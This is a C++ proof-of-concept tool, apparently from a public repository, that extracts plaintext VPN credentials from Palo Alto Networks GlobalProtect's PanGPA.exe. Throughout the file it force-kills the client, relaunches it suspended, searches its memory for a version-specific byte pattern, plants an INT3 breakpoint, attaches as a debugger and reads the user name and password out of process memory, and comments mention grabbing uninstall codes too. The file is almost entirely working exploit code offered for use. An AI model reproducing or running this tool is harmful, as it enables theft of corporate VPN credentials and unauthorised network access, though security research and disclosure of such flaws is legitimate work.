#include <windows.h>
#include <iostream>
#include <vector>
#include <cstdlib>
#include <string>
#pragma comment(lib, "Dbghelp.lib")

std::string searchAndReplace(std::string str, const std::string& search, const std::string& replace) {
    size_t pos = 0;

    // Find and replace all occurrences of the search string
    while ((pos = str.find(search, pos)) != std::string::npos) {
        str.replace(pos, search.length(), replace);
        pos += replace.length(); // Move past the new string
    }

    return str;
}

std::string htmlDecode(const std::string& str) {
    std::string decoded = str;
    // Replace HTML entities with their respective characters
    //std::string modified = searchAndReplace(original, search, replace);

    std::string decoded1 = searchAndReplace(decoded, "&amp;", "&");
    std::string decoded2 = searchAndReplace(decoded1, "&lt;", "<");
    std::string decoded3 = searchAndReplace(decoded2, "&gt;", ">");
    std::string decoded4 = searchAndReplace(decoded3, "&quot;", "\"");
    std::string decoded5 = searchAndReplace(decoded4, "&apos;", "'");
    return decoded5;
}

void prettyPrintXML(const std::vector<BYTE>& buffer, SIZE_T bytesRead) {
    // Convert buffer to string
    std::string xml(reinterpret_cast<const char*>(buffer.data()), bytesRead);

    std::string userValue;
    std::string passwdValue;

    size_t pos = 0;

    // Extract <user> value
    size_t userStart = xml.find("<user>", pos);
    if (userStart != std::string::npos) {
        userStart += 6; // Move past <user>
        size_t userEnd = xml.find("</user>", userStart);
        if (userEnd != std::string::npos) {
            userValue = xml.substr(userStart, userEnd - userStart);
        }
    }

    // Extract <passwd> value
    size_t passwdStart = xml.find("<passwd>", pos);
    if (passwdStart != std::string::npos) {
        passwdStart += 8; // Move past <passwd>
        size_t passwdEnd = xml.find("</passwd>", passwdStart);
        if (passwdEnd != std::string::npos) {
            passwdValue = xml.substr(passwdStart, passwdEnd - passwdStart);
            // Drop the first character
            if (!passwdValue.empty()) {
                passwdValue.erase(0, 1);
            }
        }
    }
    // std::string modified = searchAndReplace(original, search, replace);
    // Print the extracted values
    std::string passwdValueDecoded = htmlDecode(passwdValue);
    std::cout << "************************************************************" << std::endl;
    std::cout << "User: " << userValue << std::endl;
    std::cout << "Password: " << passwdValueDecoded << std::endl;
    std::cout << "************************************************************" << std::endl;
}

void PrintAddressAtRSI(HANDLE hThread) {
    CONTEXT context;
    context.ContextFlags = CONTEXT_INTEGER;

    if (SuspendThread(hThread) == -1) {
        std::cerr << "[!] Failed to suspend thread. Error: " << GetLastError() << std::endl;
        return;
    }

    if (GetThreadContext(hThread, &context)) {
        //ULONG_PTR rsiAddress = context.Rsi;
        //RDX for updated version of PanGPA
        ULONG_PTR rdxAddress = context.Rdx;
        // Jump back a little to make sure you get the user name
        rdxAddress = rdxAddress - 100;
        //std::cout << "[*] Address at RSI: " << std::hex << rsiAddress << std::endl;
        std::cout << "[*] Address at RDX: " << std::hex << rdxAddress << std::endl;
        DWORD processId = GetProcessIdOfThread(hThread);
        if (processId == 0) {
            std::cerr << "[!] Failed to get process ID from thread handle. Error: " << GetLastError() << std::endl;
            ResumeThread(hThread);
            return;
        }

        HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, processId);
        if (hProcess == NULL) {
            std::cerr << "[!] OpenProcess failed. Error: " << GetLastError() << std::endl;
            ResumeThread(hThread);
            return;
        }

        std::vector<BYTE> buffer(0x100);
        SIZE_T bytesRead;

        //if (ReadProcessMemory(hProcess, (LPCVOID)rsiAddress, buffer.data(), buffer.size(), &bytesRead)) {
        //    std::cout << "[*] Read " << bytesRead << " bytes from address " << std::hex << rsiAddress << ":\n\n";
        if (ReadProcessMemory(hProcess, (LPCVOID)rdxAddress, buffer.data(), buffer.size(), &bytesRead)) {
            std::cout << "[*] Read " << bytesRead << " bytes from address " << std::hex << rdxAddress << ":\n\n";
            //std::cout << "ASCII output:\n\n";
            prettyPrintXML(buffer, bytesRead);
            //for (size_t i = 0; i < bytesRead; ++i) {
                // Print only printable ASCII characters
            //    if (isprint(buffer[i])) {
            //        std::cout << (char)buffer[i];
            //    }
            //    else {
            //        std::cout << '.'; // Replace non-printable characters with a dot
            //    }
            //}
            std::cout << std::endl;
        }
        else {
            //std::cerr << "[!] Failed to read memory at address: " << std::hex << rsiAddress
            std::cerr << "[!] Failed to read memory at address: " << std::hex << rdxAddress
                << ". Error: " << GetLastError() << std::endl;
        }

        CloseHandle(hProcess);
    }
    else {
        std::cerr << "[!] Failed to get thread context. Error: " << GetLastError() << std::endl;
    }

    return;
}


void DebugProcess(HANDLE hProcess, HANDLE hThread, ULONG_PTR breakpointAddress) {
    DEBUG_EVENT debugEvent;

    while (WaitForDebugEvent(&debugEvent, INFINITE)) {
        // std::cout << "Received debug event: ";
        switch (debugEvent.dwDebugEventCode) {
        case EXCEPTION_DEBUG_EVENT: {
            // std::cout << "EXCEPTION_DEBUG_EVENT" << std::endl;
            EXCEPTION_RECORD exceptionRecord = debugEvent.u.Exception.ExceptionRecord;

            // Print the address where the exception occurred
            std::cout << "[*] Exception occurred at address: " << std::hex << exceptionRecord.ExceptionAddress << std::endl;


            // Check if the hit breakpoint is the one we set
            if (exceptionRecord.ExceptionAddress == (LPCVOID)breakpointAddress) {
                std::cout << "[*] Hit the set breakpoint in thread HEX : " << std::hex << debugEvent.dwThreadId << std::endl;
                HANDLE DebugThread = OpenThread(THREAD_ALL_ACCESS, FALSE, debugEvent.dwThreadId);
                if (DebugThread) {
                    DWORD exitCode;
                    if (GetExitCodeThread(DebugThread, &exitCode)) {
                        if (exitCode == STILL_ACTIVE) {
                            // The thread is still active; you can proceed to get its context
                            PrintAddressAtRSI(DebugThread);
                        }
                        else {
                            std::cerr << "[!] Thread has exited. Exit code: " << exitCode << std::endl;
                        }
                    }
                    else {
                        std::cerr << "[!] Failed to get exit code. Error: " << GetLastError() << std::endl;
                    }
                    CloseHandle(DebugThread);
                }
                else {
                    std::cerr << "[!] Failed to open thread. Error: " << GetLastError() << std::endl;
                }

                ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                return; // Return if the set breakpoint is hit
            }
            break;
        }
        case CREATE_THREAD_DEBUG_EVENT:
            //std::cout << "CREATE_THREAD_DEBUG_EVENT" << std::endl;
            break;
        case CREATE_PROCESS_DEBUG_EVENT:
            //std::cout << "CREATE_PROCESS_DEBUG_EVENT" << std::endl;
            break;
        case EXIT_THREAD_DEBUG_EVENT:
            //std::cout << "EXIT_THREAD_DEBUG_EVENT" << std::endl;
            break;
        case EXIT_PROCESS_DEBUG_EVENT:
            std::cout << "[!] EXIT_PROCESS_DEBUG_EVENT" << std::endl;
            std::cout << "[!] Process exited. Exiting debug loop." << std::endl;
            ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
            return; // Exit the loop and end debugging
        case LOAD_DLL_DEBUG_EVENT:
            // std::cout << "LOAD_DLL_DEBUG_EVENT" << std::endl;
            break;
        case UNLOAD_DLL_DEBUG_EVENT:
            //std::cout << "UNLOAD_DLL_DEBUG_EVENT" << std::endl;
            break;
        case OUTPUT_DEBUG_STRING_EVENT:
            //std::cout << "OUTPUT_DEBUG_STRING_EVENT" << std::endl;
            break;
        case RIP_EVENT:
            //std::cout << "RIP_EVENT" << std::endl;
            break;
        default:
            
            break;
        }
        // std::cout << "Continuing" << std::endl;
        ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
    }
}

ULONG_PTR MemSearch(DWORD processId, const std::vector<BYTE>& hexPattern) {
    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (processHandle == nullptr) {
        std::cerr << "Failed to open process." << std::endl;
        return 0; // Handle error as needed
    }

    ULONG_PTR address = 0;
    MEMORY_BASIC_INFORMATION mbi;

    try {
        // Loop through the memory regions
        while (VirtualQueryEx(processHandle, (LPCVOID)address, &mbi, sizeof(mbi))) {
            // Check if the region is executable and not part of the stack or heap
            if ((mbi.Protect & PAGE_EXECUTE_READ) != 0 && mbi.State == MEM_COMMIT) {
                std::vector<BYTE> buffer(mbi.RegionSize);
                SIZE_T bytesRead;

                // Read the memory region
                if (ReadProcessMemory(processHandle, mbi.BaseAddress, buffer.data(), mbi.RegionSize, &bytesRead)) {
                    // Search for the hexPattern in the buffer
                    for (size_t i = 0; i <= bytesRead - hexPattern.size(); i++) {
                        bool found = true;

                        for (size_t j = 0; j < hexPattern.size(); j++) {
                            if (buffer[i + j] != hexPattern[j]) {
                                found = false;
                                break;
                            }
                        }

                        if (found) {
                            return (ULONG_PTR)mbi.BaseAddress + i; // Return the address where the pattern is found
                        }
                    }
                }
            }

            // Move to the next memory region
            address += mbi.RegionSize;
        }
    }
    catch (...) {
        // Handle exceptions as needed
        std::cerr << "An exception occurred." << std::endl;
    }

    // Cleanup
    CloseHandle(processHandle);

    return 0; // Pattern not found
}

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    std::cout << " \n\n ######   #####  ###    ##  ######  ######   #####      ####### #######  ###### ######  ####### ######## " << std::endl;
    std::cout << " ##   ## ##   ## ####   ## ##       ##   ## ##   ##     ##      ##      ##      ##   ## ##         ##    " << std::endl;
    std::cout << " ######  ####### ## ##  ## ##   ### ######  #######     ####### #####   ##      ######  #####      ##    " << std::endl;
    std::cout << " ##      ##   ## ##  ## ## ##    ## ##      ##   ##          ## ##      ##      ##   ## ##         ##    " << std::endl;
    std::cout << " ##      ##   ## ##   ####  ######  ##      ##   ##     ####### #######  ###### ##   ## #######    ##    " << std::endl;
    std::cout << "\n\n";
    std::cout << "             ####### ##   ## ######## ######   #####   ###### ########  ######  ######                   " << std::endl;
    std::cout << "             ##       ## ##     ##    ##   ## ##   ## ##         ##    ##    ## ##   ##                  " << std::endl;
    std::cout << "             #####     ###      ##    ######  ####### ##         ##    ##    ## ######                   " << std::endl;
    std::cout << "             ##       ## ##     ##    ##   ## ##   ## ##         ##    ##    ## ##   ##                  " << std::endl;
    std::cout << "             ####### ##   ##    ##    ##   ## ##   ##  ######    ##     ######  ##   ##                  " << std::endl;
    std::cout << "\n\n PoC for plaintext extraction of user credentials by @bbhacks - https://github.com/t3hbb/PanGP_Extractor\n" << std::endl;

    // Close any currenttly running
    system("taskkill /IM PanGPA.exe /F > NUL 2>&1");
    
    // Start a new instance suspended so we can fettle it    
    if (!CreateProcess(L"C:\\Program Files\\Palo Alto Networks\\GlobalProtect\\panGPA.exe", nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        std::cerr << "[!] Failed to create process. Error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[*] Successfully created suspended process with PID: " << pi.dwProcessId << std::endl;

    // Define the pattern to search for
    //std::vector<BYTE> pattern = { 0xBA, 0x2A, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x40, 0xF8, 0xE8, 0xA3, 0xC8, 0x37, 0x00, 0x48, 0x8D, 0x15 };
    //Update for 6.2.6-383
    std::vector<BYTE> pattern = { 0x48, 0x8D, 0x15, 0x83, 0x77, 0x4F, 0x00, 0x48, 0x8B, 0xC8, 0xE8, 0x13, 0x70 };

    //
    // You can set a second BP here and get the uninstall and deactivate password/codes but currently it faults ¯\_(ツ)_/¯
    // 
    // std::vector<BYTE> pattern = { 0x48, 0x8D, 0x15, 0x51, 0x9C, 0x4C, 0x00 };
    
    
    
    // Search for the byte pattern in the .text section
    // Get process ID from the process handle
    DWORD processId = GetProcessId(pi.hProcess);

    // Call MemSearch with the process ID and pattern
    ULONG_PTR breakpointAddress = MemSearch(processId, pattern);

    if (breakpointAddress != 0) {
        std::cout << "[*] Pattern found at address: " << std::hex << breakpointAddress << std::endl;
    }
    else {
        std::cerr << "[!] Pattern not found." << std::endl;
        return 1;
    }

    // Set the breakpoint
    BYTE originalByte;
    SIZE_T bytesRead;

    // Cast breakpointAddress to LPCVOID
    if (ReadProcessMemory(pi.hProcess, (LPCVOID)breakpointAddress, &originalByte, sizeof(originalByte), &bytesRead) && bytesRead == sizeof(originalByte)) {
        BYTE breakpointByte = 0xCC; // INT 3
        // Cast breakpointAddress to LPVOID
        if (WriteProcessMemory(pi.hProcess, (LPVOID)breakpointAddress, &breakpointByte, sizeof(breakpointByte), nullptr)) {
            std::cout << "[*] Breakpoint set successfully at address: " << std::hex << breakpointAddress << std::endl;
        }
        else {
            std::cerr << "[!] Failed to set breakpoint at address: " << std::hex << breakpointAddress << ". Error: " << GetLastError() << std::endl;
            return 1;
        }
    }
    else {
        std::cerr << "[!] Failed to read memory at address: " << std::hex << breakpointAddress << ". Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Resume the thread to start execution
    DWORD resumeResult = ResumeThread(pi.hThread);
    if (resumeResult == (DWORD)-1) {
        std::cerr << "[!] Failed to resume thread. Error: " << GetLastError() << std::endl;
        return 1;
    }
    else {
        std::cout << "[*] Thread resumed successfully." << std::endl;
        Sleep(500); //becuase f*ck multithreaded apps and exceptions

        // Debug the process
        // Attach the debugger to the newly created process
        if (DebugActiveProcess(pi.dwProcessId)) {
            std::cout << "[*] Debugger attached to process with PID: " << std::dec << pi.dwProcessId << std::endl;
            if (pi.hProcess != nullptr) {
                std::cout << "[*] Debugging Process" << std::endl;
                DebugProcess(pi.hThread, pi.hProcess, breakpointAddress);
        
                // Try a HW breakPint instead to see if it works
                //HWBreak(pi.hThread, breakpointAddress);
                // Spoiler :  It didn't
            }
            else {
                std::cerr << "[!] Failed to attach debugger. Error: " << GetLastError() << std::endl;
                return 1;
                }
        }
        else {
            std::cerr << "[!] Invalid process handle." << std::endl;
            return 1;
        }
    }
    
    // Clean up
    std::cout << "[*] Cleaning Up ..." << std::endl;

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    TerminateProcess(pi.hProcess, 0);

    std::cout << "[*] Relaunching panGPA ..." << std::endl;; //  because I literally cannot be f@#ked to worry about restarting suspended threads for the PoC - see TODO etc." << std::endl;
    if (!CreateProcess(L"C:\\Program Files\\Palo Alto Networks\\GlobalProtect\\panGPA.exe", nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        std::cerr << "Failed to restart process. Error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[*] Successfully restarted panGPA.exe " << pi.dwProcessId << std::endl;

    return 0;
}


// TODO
// Restore value at breakpoints before resuming rather than relaunching the application
// Figure out why BP#2 causes the attached PanGPA to error by executing code at the base memory address :/
// Like literally the faulting address is the equivalent of 0x4000000 in x86
// Clean Up Taskbar to remove ghost/orphaned icons
